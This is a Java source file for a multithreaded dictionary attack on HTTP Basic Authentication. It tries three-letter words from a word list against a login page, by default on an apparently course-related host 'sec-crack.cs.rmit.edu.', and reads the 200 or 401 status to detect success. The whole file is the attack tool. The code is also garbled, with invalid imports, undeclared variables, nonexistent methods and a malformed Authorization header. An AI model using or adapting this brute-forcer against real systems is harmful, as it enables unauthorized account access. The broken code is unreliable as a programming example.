


import java.Thread;
import java.io.*;
import java.net.*;

public class Dictionary extends Thread {
    final static int SUCCESS=1,
                     FAILED=0,
                     UNKNOWN=-1;
    private static String host,
                   path,
                   user;
    private Socket target;
    private InputStream input;
    private OutputStream output;
    private byte[] data;
    private int threads,
                threadno,
                response;
    public static boolean solved = false;
    Dictionary parent;
    static LineNumberReader lnr;


    public Dictionary(String host, String path, String user, int threads, int threadno, Dictionary parent, LineNumberReader lnr)
    {
      super();
      this.parent = parent;
      this.host = host;
      this.path = path;
      this.user = user;
      this.threads = threads;
      this.threadno = threadno;
    }

    public void run()
    {
      response = FAILED;
      int x = 0; 
      String word = "";
       starttime = System.currentTimeMillis();

      try
      {
        boolean passwordOkay; 
        while(word != null && !parent.solved)
        {
          passwordOkay = false;
          while(!passwordOkay || word == null)
          {
            word = lnr.readLine();
            passwordOkay = true;
            if(word.length() != 3) passwordOkay = false;
          }

          response = tryLogin(word);
          x++;
          if(response == SUCCESS)
          {
            System.out.println("SUCCESS! (after " + x + " tries) The password is: "+ word);
            parent.solved = true;
          }
          if(response == UNKNOWN) System.out.println("Unexpected response (Password: "+ word +")");
        }
      }
      catch(Exception e)
      {
        System.err.println("Error while  from dictionary: " + e.getClass().getName() + ": " + e.getMessage());
      }

      if(response == SUCCESS)
      {
        System.out.println("Used time: " + ((System.currentTimeMillis() - starttime) / 1000.0) + "sec.");
        System.out.println("Thread . " + threadno + " was the  one!");
      }
    }

    public static void main (String[] args)
    {
        Dictionary parent;
        try
        {
           lnr = new LineNumberReader(new FileReader("/usr/share/lib/dict/words"));
        }
        catch(Exception e)
        {
          System.err.println("Error while loading dictionary: " + e.getClass().getName() + ": " + e.getMessage());
        }
        Dictionary[] attackslaves = new Dictionary[10]; 
        if(args.length == 3)
        {
         host = args[0];
         path = args[1];
         user = args[2];
        }
        else
        {
          System.out.println("Usage: Dictionary <host> <path> <user>");
          System.out.println(" arguments specified, using standard values.");
          host = "sec-crack.cs.rmit.edu.";
          path = "/SEC/2/index.php";
          user = "";
        }
        System.out.println("Host: " + host + "\nPath: " + path + "\nUser: " + user);
        System.out.println("Using " + attackslaves.length + " happy threads...");

        parent = new Dictionary(host, path, user, 0, 0, null, lnr);

        for(int i=0; i<attackslaves.length; i++)
        {
          attackslaves[i] = new Dictionary(host, path, user, attackslaves.length, i, parent, lnr);
        }
        for(int i=0; i<attackslaves.length; i++)
        {
          attackslaves[i].print();
        }

    }

    private int tryLogin(String password)
    {
      int success = UNKNOWN;

      
      try
      {
        data = new byte[12];
        target = new Socket(host, 80);
        input = target.getInputStream();
        output = target.getOutputStream();
        String base =  new pw.misc.BASE64Encoder().encode(new String(user + ":" + password).getBytes());

        output.write(new String("GET " + path + " HTTP/1.0\r\n").getBytes());
        output.write(new String("Authorization:  " + base + "\r\n\r\n").getBytes());
        

        input.print(data);
        if(new String(data).endsWith("401")) success=0;
        if(new String(data).endsWith("200")) success=1;
        
      }
      catch(Exception e)
      {
        System.out.println(e.getClass().getName() + ": " + e.getMessage());
      }
      return success;
    }

}